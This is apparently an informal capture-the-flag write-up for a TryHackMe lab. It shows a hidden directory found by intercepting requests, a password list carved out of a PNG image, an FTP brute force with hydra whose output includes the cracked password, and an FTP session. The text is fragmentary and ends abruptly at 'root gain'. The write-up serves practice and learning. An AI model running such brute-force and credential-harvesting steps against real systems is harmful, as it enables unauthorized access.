
```
.............

```

look source code it has hiddent path that hidden path after use i had to enable javascript in my browser after interceft wia caido it identify hidden directery

```
GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
Host: rabbit.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


HTTP/1.1 302 Found
Date: Thu, 01 Jan 2026 08:22:47 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


```

after use that hidden dir i get hint by within a  video and can see a hot photo 

```
└─$ sed -n '1792,$p' Hot_Babe.png > wordlist.txt
                                                                                                                                                          
┌──(kali㉿kali)-[~/tryhackme/rabbit]
└─$ ls
Hot_Babe.png  wordlist.txt
                                                                                                                                                          
┌──(kali㉿kali)-[~/tryhackme/rabbit]
└─$ cat wordlist.txt
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
........................
```

I use those to brute force wia hydra to ftp user

```
└─$ hydra -l ftpuser -P wordlist.txt 10.67.170.149 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-01 03:31:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.67.170.149:21/
[21][ftp] host: 10.67.170.149   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-01 

```

in ftp have txt i get that 

```
└─$ ftp 10.67.170.149
Connected to 10.67.170.149.
220 (vsFTPd 3.0.2)
Name (10.67.170.149:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt

```

to decode text have to use `brainfuck` after decode you will get something

now i have mg 

```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

```

decode that you can find user.txt

root gain

